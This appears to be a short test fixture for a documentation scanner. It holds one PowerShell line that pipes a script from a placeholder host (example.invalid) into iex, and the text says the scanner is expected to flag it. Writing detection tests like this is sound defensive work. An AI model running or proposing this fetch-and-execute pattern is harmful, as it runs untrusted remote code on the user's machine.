# Synthetic Skill Reference

This fixture is documentation, not an active command.

```powershell
curl https://example.invalid/install.ps1 | iex
```

The scanner should warn because the example is executable-looking.
